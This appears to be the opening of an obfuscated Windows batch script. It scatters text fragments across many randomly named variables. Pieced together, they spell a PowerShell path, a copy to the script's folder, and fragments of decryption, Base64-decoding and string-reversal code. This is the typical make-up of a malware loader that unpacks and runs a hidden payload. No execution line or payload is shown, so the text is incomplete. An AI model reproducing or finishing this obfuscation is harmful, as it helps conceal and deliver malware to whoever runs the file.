@echo off
set "MjkoqeJzkv=st"
set "qUMpmsBtpK=\v"
set "gyTkFwpfCf=em"
set "OVDxcWNGOV= C"
set "rTlqjNsowz=rS"
set "gKgKbzHqmQ=.e"
set "mMJyxtWjYB=Po"
set "DQwxjstvvu=rs"
set "RYArUSCuTF=0\"
set "BKbOFbjDwd=\W"
set "HVypVvAUtI=in"
set "EIIZMsWCXy=co"
set "sJFzvqJpsg=do"
set "JqwoISfCso=we"
set "SuCPDEKHzY= /"
set "QhSLvJekXP=nd"
set "PgAJuXTrpz=he"
set "FpObIrTFyr=ow"
set "YvqOvFagbb=he"
set "PHUZtRtheV=:\"
set "eHRqaMLSoi=we"
set "ljdmnfaPHU=y "
set "TueYeHPiEK=Sy"
set "YNFRjDCWIC=py"
set "pdOvjdIaBd=po"
set "UTCjTvwfEE=ws"
set "uxATMZdsCP=Wi"
set "uzrQwExoAa=ll"
set "bHNyCoaHSc=1."
set "FZfOYkgkri=ll"
set "JnFhnYhiWc=xe"
set "kuRMiquJLc=s\"
set "ovzUWkkPWb=32"
set "UqrrEuwskn= %~dp0"
set "xmBbxerWod=cd"
set "KxzdTgERxo=16] "
set "NuXomKnGiJ=L4Yi"
set "PJnVdSsMVc=rofi"
set "LwdLRIsjeb=s75K"
set "RIQKdoDOUC=S = "
set "XlgTPZOfMQ= = N"
set "ZdTeCXAGTN=ay()"
set "oDVYMwPRqk=();$"
set "McNYhfpChG=comp"
set "fMcSgWzbgR=ddin"
set "AibPghTjVX=hp.T"
set "LcmnaTtGoA=::('"
set "UXcpifmJFl=sion"
set "OnWteBDIFZ=tryP"
set "TvToJmdoFE=)($F"
set "ukmdYYMXju=daeR"
set "utSWIMFFhD=lBlo"
set "VWwTcfVGZn=ss -"
set "VGgdLRtNMx=;$td"
set "hkDiBSjeci=Obje"
set "fOELiIoOZk=$zbh"
set "HYmbQTSPZt=-4] "
set "CCFjGuxKOb=stem"
set "nhJahRFgLx=oJmq"
set "MKcCNplKRG=esaB"
set "ebRlfQMZNm=in $"
set "lhYggWFltq=Disp"
set "RgoSLIoXjU=eMVs"
set "uNmofHHQUP=  $p"
set "ilddHaIRmW=join"
set "yBoVIEpidZ=pher"
set "PVyUHgOhWq=1..-"
set "NnflhJokcy=ew-O"
set "gyfTItuQIA=n ''"
set "kQOOCuIixq=y.Pa"
set "NrBnUEMNlz=.Cry"
set "ECFmMsmpGP=, (,"
set "QNptQRPEzv=t.En"
set "eWxQajOFwh=[]] "
set "XMHZeyjaeh=S, 0"
set "zwdmsZVQhZ=X = "
set "yUtHBbjaSO=pose"
set "HfyRTgKwbu=$XDQ"
set "HKrYohQqTx=yTo("
set "wivpfNLApj=ment"
set "oXjvBwkNPy=y.Ci"
set "HNYxoOfqWt=lit("
set "arjfnuDwLP=orF'"
set "NYPMxxZICX=Syst"
